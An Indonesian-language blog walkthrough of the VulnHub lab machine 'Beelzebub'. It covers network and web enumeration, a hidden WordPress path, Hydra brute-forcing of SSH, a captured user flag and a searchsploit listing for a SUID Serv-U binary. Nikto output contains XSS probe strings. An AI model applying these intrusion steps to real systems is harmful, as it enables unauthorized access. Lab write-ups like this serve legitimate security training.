---
layout: post
title: "VulnHub: Beelzebub"
date: 2022-11-17
categories: [vulnhub]
tags: [serv-u, arp-scan, wordpress]
---


## firstly - tty shell
karena ini virtual box, dan vmbox ini sering ke suspend mode yang akhirnya membawa malapetaka dan harus restart-restart terus.
dengan kata lain, ini menyebabkan saya stress, lalu saya bawa machine ini ke tty shell dengan memencet `HOST KEY` + `F2`.

![imagelol](https://i.postimg.cc/NMQSrmRm/image.png)

well, `/dev/tty2`. 

## recon
## discovering host 
```
╭─ via [vh/beelzebub]
╰─ sudo arp-scan --localnet
Interface: wlan0, type: EN10MB, MAC: xx:xx:dx:xx:xx:xx, IPv4: 192.168.100.14
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1	xx:xx:4b:xx:xx:xx	HUAWEI TECHNOLOGIES CO.,LTD
192.168.100.12	08:xx:xx:06:xx:xx	PCS Systemtechnik GmbH
```
karena saya paling males sama hal-hal yang membuat diri saya sendiri ribet dan kesal, maka saya menyimpan IP ke dalam bentuk variabel.
```sh
╭─ via [vh/beelzebub]
╰─ victim=192.168.100.12
```
## nmap scanning
```sh
Host is up, received syn-ack (0.00044s latency).
Scanned at 2022-11-17 12:19:36 WIB for 6s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoqt4FP0lhkJ0tTiMEUrVqRIcNKgQK22LJCOIVa1yoZf+bgOqsR4mIDjgpaJm/SDrAzRhVlD1dL6apkv7T7iceuo5QDXYvRLWS+PfsEaGwGpEVtpTCl/BjDVVtohdzgErXS69pJhgo9a1yNgVrH/W2SUE1b36ODSNqVb690+aP6jjJdyh2wi8GBlNMXBy6V5hR/qmFC55u7F/z5oG1tZxeZpDHbgdM94KRO9dR0WfKDIBQGa026GGcXtN10wtui2UHo65/6WgIG1LxgjppvOQUBMzj1SHuYqnKQLZyQ18E8oxLZTjc6OC898TeYMtyyKW0viUzeaqFxXPDwdI6G91J
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO9gF8Fv+Uox9ftsvK/DNkPNObtE4BiuaXjwksbOizwtXBepSbhUTyL5We/fWe7x62XW0CMFJWcuQsBNS7IyjsE=
|   256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINfCRDfwNshxW7uRiu76SMZx2hg865qS6TApHhvwKSH5
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 17 12:19:42 2022 -- 1 IP address (1 host up) scanned in 7.77 seconds
```
Jadi ini hasil nmap yang bisa disimpulkan.
* `22/TCP` dengan state `open`, service `ssh` dan versinya `OpenSSH 7.6.p1`
* `80/TCP` dengan state `open`, service `HTTP` dan versi `Apache httpd 2.4.29`.

Karena tidak ada yang menarik maka saya lanjut ke `discovering web directory` agar mendapatkan jalan masuk yang lebih banyak maybe(?)

## web directory discovery
```sh
/javascript           (Status: 301) [Size: 319] [--> http://192.168.100.12/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://192.168.100.12/phpmyadmin/]
/server-status        (Status: 403) [Size: 278]
```
saat saya menggunakan gobuster dan saya menemukan tiga directory yang kedua dari atas memiliki status `301` yang artinya `Moved Permanently` atau biasanya digunakan untuk `permanent redirecting`, yang dimaksudkan bahwa link atau record yang kembali pada respon ini harus segera diperbarui. 

lalu saya menggunakan command yang sama dengan tambahan `-x` agar mendapatkan file extension yang menarik, masih menggunakan `gobuster`.
```
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 271]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.100.12/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://192.168.100.12/phpmyadmin/]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/phpinfo.php          (Status: 200) [Size: 95422]
/server-status        (Status: 403) [Size: 278]
```
lihat, kedua file index memiliki status `200` yang artinya sukses, dimana client sudah meminta dokumen dari server, dan server memberikan sekaligus menjawabnya dengan apa yang diinginkan client. bisa dilihat lebih jauh tentang ini pada gambar di bawah.

![god](https://pbs.twimg.com/media/Feci7EYUAAAODkv?format=jpg&name=medium)
<p style="text-align: center; padding-bottom: 10px">source: <a href="https://twitter.com/hackinarticles/status/157826870160583065">Hacking Articles' Tweet</a></p>

## nikto outputs
```
╭─ via [vh/beelzebub]
╰─ cat nikto_scan      
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.30
+ Target Hostname:    192.168.56.30
+ Target Port:        80
+ Start Time:         2022-11-17 12:21:08 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x59558e1434548 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Multiple index files found: /index.php, /index.html
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ /phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>: Output from the phpinfo() function was found.
+ Uncommon header 'x-permitted-cross-domain-policies' found, with contents: none
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ Uncommon header 'x-robots-tag' found, with contents: noindex, nofollow
+ /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /phpinfo.php?GLOBALS[test]=<script>alert(document.cookie);</script>: Output from the phpinfo() function was found.
+ /phpinfo.php?cx[]=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<script>alert(foo)</script>: Output from the phpinfo() function was found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 7686 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2022-11-17 12:22:35 (GMT7) (87 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.29) are not in
      the Nikto database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)?
```
ah, kelamaan ribet. saya sudah mencoba untuk memasang `tiny webshell` tapi tetap saya ada `encoding protection` pada bagian `$_SERVER['QUERY_STRING']`.

## /phpinfo.php
```
╭─ via [vh/beelzebub]
╰─ curl -sI $victim/phpinfo.php
HTTP/1.1 200 OK
Date: Sat, 26 Nov 2022 04:42:33 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```
hmm, tidak ada yang mencurigakan pada `phpinfo.php`. mungkin ini versi terupdate, makanya saya pikir ini ga ada exploitnya hehe.
```
╭─ via [vh/beelzebub]
╰─ curl -s $victim/phpinfo.php | head -10
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #fff; color: #222; font-family: sans-serif;}
pre {margin: 0; font-family: monospace;}
a:link {color: #009; text-decoration: none; background-color: #fff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
.center {text-align: center;}
.center table {margin: 1em auto; text-align: left;}
```
coba saya ambil textnya.
```
## PHP Variables
╭─ via [vh/beelzebub]
╰─ curl -s $victim/phpinfo.php | html2text
..[snippet]..

Variable| Value  
---|---  
$_SERVER['HTTP_HOST']| 192.168.100.12  
$_SERVER['HTTP_USER_AGENT']| curl/7.86.0  
$_SERVER['HTTP_ACCEPT']| */*  
$_SERVER['PATH']| /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
$_SERVER['SERVER_SIGNATURE']| <address>Apache/2.4.29 (Ubuntu) Server at
192.168.100.12 Port 80</address>  
$_SERVER['SERVER_SOFTWARE']| Apache/2.4.29 (Ubuntu)  
$_SERVER['SERVER_NAME']| 192.168.100.12  
$_SERVER['SERVER_ADDR']| 192.168.100.12  
$_SERVER['SERVER_PORT']| 80  
$_SERVER['REMOTE_ADDR']| 192.168.100.14  
$_SERVER['DOCUMENT_ROOT']| /var/www/html  
$_SERVER['REQUEST_SCHEME']| http  
$_SERVER['CONTEXT_PREFIX']|  _no value_  
$_SERVER['CONTEXT_DOCUMENT_ROOT']| /var/www/html  
$_SERVER['SERVER_ADMIN']| webmaster@localhost  
$_SERVER['SCRIPT_FILENAME']| /var/www/html/phpinfo.php  
$_SERVER['REMOTE_PORT']| 54116  
$_SERVER['GATEWAY_INTERFACE']| CGI/1.1  
$_SERVER['SERVER_PROTOCOL']| HTTP/1.1  
$_SERVER['REQUEST_METHOD']| GET  
$_SERVER['QUERY_STRING']|  _no value_  
$_SERVER['REQUEST_URI']| /phpinfo.php  
$_SERVER['SCRIPT_NAME']| /phpinfo.php  
$_SERVER['PHP_SELF']| /phpinfo.php  
$_SERVER['REQUEST_TIME_FLOAT']| 1669437872.657  
$_SERVER['REQUEST_TIME']| 1669437872  

..[snippet]..
```
well, cuma informasi kecil. yang sebenarnya tidak berguna.

## 80/TCP - Apache

Okey lanjut, saya periksa antara index dengan format extension `html` dan satunya `php` dan ingin membandingkan apa yang beda dari mereka berdua.
```html
╭─ via [vh/beelzebub]
╰─ curl -s $victim
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2016-11-16
    See: https://launchpad.net/bugs/1288690
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: It works</title>
    <style type="text/css" media="screen">
  * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }

..[snippet]..
```
ketika saya ingin melihat headernya.
```sh
╭─ via [vh/beelzebub]
╰─ curl -sI $victim
HTTP/1.1 200 OK
Date: Sat, 26 Nov 2022 04:31:31 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Sun, 20 Oct 2019 15:04:12 GMT
ETag: "2aa6-59558e1434548"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
Content-Type: text/html
```
aman, tidak ada yang mencurigakan. what about the other one? saya ingin melihat.
```
╭─ via [vh/beelzebub]
╰─ curl -sI $victim/index.php
HTTP/1.1 200 OK
Date: Sat, 26 Nov 2022 04:33:44 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```
tidak ada yang mencurigakan sih, what about the content?
```
╭─ via [vh/beelzebub]
╰─ curl -s $victim/index.php
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5-->
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.30 (Ubuntu)</address>
</body></html>
```
HAHAHA, lucu banget ya. harus ditipu gini pake `html`. rada memaksa banget sih sebenarnya. untung CTF.

wait what, versi `Apache` rada beda ya. `2.4.30` kalo yang di atas `2.4.29`, berarti bener mau nipu.
```
<!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5-->
```
ketika saya coba jadikan ke `md5` hash.
```
╭─ via [vh/beelzebub]
╰─ python -c 'import hashlib; m = hashlib.md5(b"beelzebub"); output = m.hexdigest(); print(output)'         
d18e1e22becbd915b45e0e655429d487
```
mungkin awalnya ada directory bernamakan `beelzebub` lalu terkena retas dan ter-decoded.

## wordpress
```
╭─ via [vh/beelzebub]
╰─ cat gobuster_md5 
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 57718]
/wp-content           (Status: 301) [Size: 350] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-content/]
/.html                (Status: 403) [Size: 277]
/wp-login.php         (Status: 200) [Size: 5694]
/license.txt          (Status: 200) [Size: 19935]
/wp-includes          (Status: 301) [Size: 351] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-includes/]
/readme.html          (Status: 200) [Size: 7368]
/wp-admin             (Status: 301) [Size: 348] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-login.php?action=register]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
```
well, saya penasaran dengan directory yang berstatus `301`. apakah bisa terekam oleh gobuster atau tidak ya? hmm. tapi sepertinya itu nanti dulu, karena saya penasaran dengan hasil dari `wpscan`.
```
╭─ via [vh/beelzebub]
╰─ wpscan --url "http://$victim/d18e1e22becbd915b45e0e655429d487/" --force --ignore-main-redirect -e

..[snippet]..

[+] krampus
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] valak
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

..[snippet]..
```
saya save credentialsnya ke file.
```
╭─ via [vh/beelzebub]
╰─ echo "krampus\nvalak" > creds
```

--

saya lanjut lagi dengan bruteforcing directory pada `/wp-includes`
```
╭─ via [vh/beelzebub]
╰─ gobuster dir -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 --no-error -x php,txt,bak,html,xml,jpg,png,conf,bak -u "http://$victim/d18e1e22becbd915b45e0e655429d487/wp-includes" --random-agent
..[snippet]..
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/rss.php              (Status: 500) [Size: 0]
/category.php         (Status: 200) [Size: 0]
/media.php            (Status: 500) [Size: 0]
/feed.php             (Status: 200) [Size: 0]
/user.php             (Status: 200) [Size: 0]
/version.php          (Status: 200) [Size: 0]
/registration.php     (Status: 500) [Size: 0]
/post.php             (Status: 200) [Size: 0]
/comment.php          (Status: 200) [Size: 0]
/images               (Status: 301) [Size: 362] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-includes/images/]
/css                  (Status: 301) [Size: 359] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-includes/css/]
/template.php         (Status: 200) [Size: 0]
/update.php           (Status: 500) [Size: 0]
/date.php             (Status: 500) [Size: 0]
/js                   (Status: 301) [Size: 358] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-includes/js/]
/query.php            (Status: 200) [Size: 0]
/taxonomy.php         (Status: 200) [Size: 0]
/cache.php            (Status: 200) [Size: 0]
/theme.php            (Status: 200) [Size: 0]
/blocks               (Status: 301) [Size: 362] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-includes/blocks/]
/blocks.php           (Status: 200) [Size: 0]
/http.php             (Status: 200) [Size: 0]
/meta.php             (Status: 200) [Size: 0]
/widgets.php          (Status: 200) [Size: 0]
/widgets              (Status: 301) [Size: 363] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-includes/widgets/]
/bookmark.php         (Status: 200) [Size: 0]
/cron.php             (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 361] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-includes/fonts/]
/customize            (Status: 301) [Size: 365] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-includes/customize/]
/plugin.php           (Status: 200) [Size: 0]
/certificates         (Status: 301) [Size: 368] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-includes/certificates/]
/functions.php        (Status: 500) [Size: 0]
/load.php             (Status: 200) [Size: 0]
/capabilities.php     (Status: 200) [Size: 0]
/locale.php           (Status: 500) [Size: 0]
/Text                 (Status: 301) [Size: 360] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-includes/Text/]
/session.php          (Status: 500) [Size: 0]
/compat.php           (Status: 500) [Size: 0]
/revision.php         (Status: 200) [Size: 0]
/embed.php            (Status: 200) [Size: 0]
/option.php           (Status: 200) [Size: 0]
/l10n.php             (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/vars.php             (Status: 500) [Size: 0]
/Requests             (Status: 301) [Size: 364] [--> http://192.168.100.12/d18e1e22becbd915b45e0e655429d487/wp-includes/Requests/]
/canonical.php        (Status: 200) [Size: 0]
/feed-rss.php         (Status: 500) [Size: 0]
/rewrite.php          (Status: 200) [Size: 0]
/deprecated.php       (Status: 200) [Size: 0]
/comment-template.php (Status: 200) [Size: 0]
/formatting.php       (Status: 200) [Size: 0]
```
Yaa, ternyata cuman file-file biasa, tidak ada yang menarik.

## shell as krampus
lanjut lagi, saya coba liat `wp-content` dan saya merujuk pada `uploads`.
![imagebitch](https://i.postimg.cc/mrVWx6B1/image.png)

saat saya kunjungi `Talk To VALAK` tersebut, suddenly memunculkan `static site` yang mungkin keliatannya `vulnerable`.

![test](https://i.postimg.cc/vBsRVFhK/image.png)

saat saya memeriksa `cookie session` ternyata di sana termaktub `password`, yang entah ini password untuk user apa.

tanpa pikir panjang, saya nyalakan `hydra` untuk bruteforce ssh dengan kedua username yang sudah saya simpan sebelumnya.

![images](https://i.postimg.cc/K83Y2TYD/image.png)

dan, boom.
```
krampus@beelzebub:~/Desktop$ cat user.txt
aq12uu909a0q921a2819b05568a992m9
krampus@beelzebub:~/Desktop$
```
## shell as root
```
krampus@beelzebub:/dev/shm$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/local/Serv-U/Serv-U
/usr/local/bin/sudo

..[snippet]..
```
`/usr/local/Serv-U/Serv-U`? saya baru denger tentang itu. karena rasa penasaran maka saya mencoba memeriksanya di `searchsploit` untuk mencari `disclosure exploitation`

```
╭─ via [vh/beelzebub]
╰─ searchsploit "Serv-U"
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
Cat Soft Serv-U FTP Server 2.4/2.5 - FTP Directory Traversal                  | windows/remote/20461.txt
Cat Soft Serv-U FTP Server 2.5 - Remote Buffer Overflow                       | linux/remote/19218.c
Cat Soft Serv-U FTP Server 2.5.x - Brute Force                                | windows/remote/20334.java
Cat Soft Serv-U FTP Server 2.5/a/b (Windows 95/98/2000/NT 4.0) - Shortcut     | windows/remote/19743.txt
Cat Soft Serv-U FTP Server 2.5a - SITE PASS Denial of Service                 | windows/dos/19664.txt
RhinoSoft Serv-U FTP Server - Session Cookie Buffer Overflow (Metasploit)     | windows/remote/16775.rb
RhinoSoft Serv-U FTP Server 3.x < 5.x - Local Privilege Escalation            | windows/local/381.c
RhinoSoft Serv-U FTP Server 3.x/4.x/5.0 - 'LIST' Buffer Overflow              | windows/dos/24029.pl
RhinoSoft Serv-U FTP Server 7.2.0.1 - 'rnto' Directory Traversal              | windows/remote/32456.txt
RhinoSoft Serv-U FTP Server 7.3 - (Authenticated) 'stou con:1' Denial of Serv | windows/dos/6660.txt
RhinoSoft Serv-U FTP Server 7.4.0.1 - 'MKD' Create Arbitrary Directories      | windows/remote/8211.pl
RhinoSoft Serv-U FTP Server 7.4.0.1 - 'SMNT' (Authenticated) Denial of Servic | windows/dos/8212.pl
RhinoSoft Serv-U FTP Server < 5.2 - Remote Denial of Service                  | windows/dos/463.c
RhinoSoft Serv-U FTPd Server - MDTM Overflow (Metasploit)                     | windows/remote/16715.rb
RhinoSoft Serv-U FTPd Server 3.x/4.x - 'SITE CHMOD' Remote Overflow           | windows/remote/149.c
RhinoSoft Serv-U FTPd Server 3.x/4.x/5.x - 'MDTM' Remote Overflow             | windows/remote/158.c
RhinoSoft Serv-U FTPd Server 3/4 - MDTM Command Stack Overflow (1)            | windows/remote/23591.c
RhinoSoft Serv-U FTPd Server 3/4 - MDTM Command Stack Overflow (2)            | windows/remote/23592.c
RhinoSoft Serv-U FTPd Server 3/4/5 - 'MDTM' Time Argument Buffer Overflow (1) | windows/dos/23760.pl
RhinoSoft Serv-U FTPd Server 3/4/5 - 'MDTM' Time Argument Buffer Overflow (2) | windows/dos/23761.c
RhinoSoft Serv-U FTPd Server 3/4/5 - 'MDTM' Time Argument Buffer Overflow (3) | windows/dos/23762.c
RhinoSoft Serv-U FTPd Server 3/4/5 - MDTM Command Time Argument Buffer Overfl | windows/remote/23763.c
RhinoSoft Serv-U FTPd Server 4.x - 'site chmod' Remote Buffer Overflow        | windows/remote/822.c
RhinoSoft Serv-U FTPd Server < 4.2 - Remote Buffer Overflow (Metasploit)      | windows/remote/18190.rb
Serv-U FTP Server - Jail Break                                                | windows/remote/18182.txt
Serv-U FTP Server - prepareinstallation Privilege Escalation (Metasploit)     | linux/local/47072.rb
